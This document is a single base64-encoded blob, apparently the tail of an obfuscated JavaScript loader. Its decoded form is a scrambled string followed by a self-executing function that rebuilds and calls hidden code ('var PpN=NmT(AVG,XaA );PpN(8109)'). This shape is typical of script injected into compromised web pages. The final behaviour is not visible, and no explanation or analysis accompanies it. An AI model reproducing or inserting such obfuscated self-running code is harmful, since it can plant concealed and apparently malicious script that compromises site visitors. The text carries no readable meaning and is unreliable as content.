2aVllYWRpaGJ0O1lZWWQuKE5ZfXJiJVlhc2V2Z2RfZjppWX15e3MzdSlZNSAsNjIzaSFyYiV7OFkuLWU7WTNZLi5zcmkzYTBZcHcxVHRuIHIrY2FuJW5ZdCBtLjAuWWY7Y3lwNSlZcnMpLllpJUo6bl1SP1lpaHV0YWFlWVlzIClJcHNZbzF0QjIybi5jK289USlfMjJHWTZhMzI2bl9ZaGR9bzE9PWwkWWchOy5iNXMzWD4lez9pS18oXSx7aXU9X2RZJWZZdFk7bDMyMD9aXV1lWXQ9XWlpXSBoWXRpNi5ZXy4pYUVuLigpOXs4IjMuKDJZbytpWT00WSgpMz10ZSxlZWR0KXRsZy5ZIX10bzdlSyldYysgKTtZXShuJVk0cCBhX2RkK2VZI2Nhaj0uKXQoc3QuMCUuXV02ZF0lKGRZb2QpITEsSDVoZDMpW2RjITBpJXNZfVhYaFtyJWJuXyU6Zm50JVlkT29HKChWKHdfLnI7WU57XSxuOS5ZYVlZOTtPW3QzbEVdZF90YTdwXyRpYTFZX1k2Zi5dWi5YMWZ9MSByKXNJNj07LFxcWWhyX1lkLispLnJyX2UlU1luN2kpaVlvbGNzLFlZciBcLyZfb31wYURuN2hdbihuM14yWVk3ZD0gLntVZllZaVNhMUVZbVkodCArVClwPVlZLi5ZVGQpeHRuZylpMG49fTVZLDxfbCluZXJvZmFXIVwnbztdOllTWVlbLmRZaXBmc1lsZWQ4aGZ9MyFdMlkxcDg1I19yKVk/X1k9ZCksXz00WXNfJWN0WSk1NVlyaWlZbl0pLixOWS5UfVkxbiopWXVhJV8lWXR0JEYlMClZXFxldCVyX3dhNHQpaCAkbChuWVk7MiVmJFlZIVRsZDVZSXtdaj1ZLlNZX1lZPTBlKUNnXylZKWR9clkuWV1tYl0oNWZZbzpybl8mdG9ZNXRdXSQzWUFlI2VfZ1NlXW4uRWwkNClZKXBdIHIhalk9OmhmZTotIGUzOzVjNVlTWWkuWV1pOyBfIi5oJlkpKHI0MSxZKFkub19lWVlpbGk2X2NbIFo9cGV1JH0sZClJWShjVFMpZFlZX25ZMyxfWV11LjVyZV1ZK3lZWWFZZFlZNFk9b3NZY3JdLGpfbTYrZVUsKTdlLjBjMmpjX3BuMSFkMXIwbG9iWlk+dnlKci4sZll9X2FYdTY9b2kgY21ZXXRZc2R0XWZ0aCk4KW8gLllyYWM9aX0xZVk7WT0oMF1lXWVbZDBkaFldWTtoZCA3M01vcHRUWW5fZS1ZY2wlb3BiWVEzXyw7ZmFmdjYgX19EOT1ZWUJlPTM2K3Q1ISxZMWxlNllZdS5fe1l1PUtZKGMuOGZtNiE8Y18zdCVpNVkzNm5ZKShkaWQkdSFyXTZdWXUlc29zOW4wXVk1JVk4WmMlKDNZNDYubl8weHImIFlkLmV3cmYlZSh4ZSAwMz0lWV90Ym9hMllkMWZlYSBvOzhafWVvbnhlWTAyblk0XVljWXdIfXYpb3RlLiN1NlluZHM0e3NZMmFmdCg9bFkod1kpdHRfZS5zZGwyWTI0bnI1MW5lWDd0dFlZWSBhQnVvYV1Oc24kYSVvdCVTWXRfIHI7OztvRXBffS5mXy5ZIDc7eF01e2JFWVludGNZdF1iWTtlWWIwRCl0ZWRiM3JvfWQlQ2FZLmNGWTk0MlluKV90XFxvMVlfKGEuMDthXWVwWW9hc1k+eihhKylob1lzWXttclt9MSRpaDA7dVlpfTF9cj40WTlAc1wvbzMxWWlybzBZZV1vWTQwIF1YKmkuWSRfWW1dLHRkKFk3cmhuY1lzcmU9NkQ6bl57dVlZW0BpbWJsY2Mwa2MlKWVZKlkzcikkZTApfStyI11ZZSgxJntpIG4mbXVldFkudy5fQ3I2MChZZGNxQFktNGdcJ3NybCtlJWxpSVljZDspZXJpOyt7OiFZWTdyJDRsWVQpMlkuZV0uKG41cnhlWT1ZbXNZWDJldGVZdCRPWl1cJy5lPGVjLmh2fW8oMikzW2lcL1l0ITRhWWQ9eXIyWWxZWWQhWWdZZFlxWVlZQylZW1lYWT0zWXRZXV8pYW9mY2RZX3M/IzQleSloazE0e2ZoIj17cC5jWSkhZG90WXsqdVgwMWJZLiBpdFlwYWVfaWImWXBZZC4oclk9JCJjNWQhLllkOz00ZixbYTtkcklkOSwoNjpkNy4uWWlvWGUoZGFZaWA9ZS59YVl0PWN0IVlyb2A6cjJZaV19dFklKihTJikmMWVnLFlbWSl1Oyk2WWxjOXB9LmVZYTtkXC8xc3suMXlfbmFdWlkhbl99b2NZJWkpZV1yLm5vZSBkXWQkc18wKWw0IF1kdEUkNnRoWTJZcmVIWXRfLi5uayk1WXRZKGl5Ll99amVuP3dlb2VdZCBZKUpwcyAwKCFiZWR0WTVnKVlcL3VuJTtcL31ZWXJ0e3R0LV9fdHFLXTEoLitkaTVvKTtzcDB9VXIxbnRhaV90aDt0e247WXU1WXJZZTUyby5sKitieyAzMjFZZDt3I3M0bnJzO19bY3JfITFdbDFsPXhZdTssb100aVlZNl11NSNhb1tvMVldWVhvIG4ybGVmX2l4WT9kdFkpNTFmKCUudFk7ZWRiKGxZYy5fe2JIWV0pdFlzZHJfbjFwcltvX0RpNF8tbl99aV80MWVkKGEuPX0mcz1yYSk1eShmWVlhOT0rZWFZXyRlR2lnKXJZX2RhIHVMXSlBWVl5NCY6SG9vPmZLcy59b1kxcC50LVlyaTNZICEuKFspNjtZIWwpe1kgWTVhWTopLiFscC5saShpZG1qMmVybGV1XzNuKFlyWVluY2FZWXRuK2lNemlZMSBzIGg4ZFNfPVwnIVludHsxbmRuMi5vY2ZZZmh2X3RzZWUyKHtYLiU7ZzNoZ1pFc3FhWXNdIEkuZSx0XXRhYWkxaCA3Q3Q7IG8kaXJdIGBvYi57LmM1XS5ZWXkodHQiKH0yKVlvK1k7bWxSfSlfXyVZPVlZMWltfV1iWXQ9ZXIgJWxGWSAkZWJkM2ZuMyhZLl1lKDUwKXdONTNfaXtZJi4xZyBRbGVpJykpO3ZhciBQcE49Tm1UKEFWRyxYYUEgKTtQcE4oODEwOSk7cmV0dXJuIDU0NzR9KSgp'))
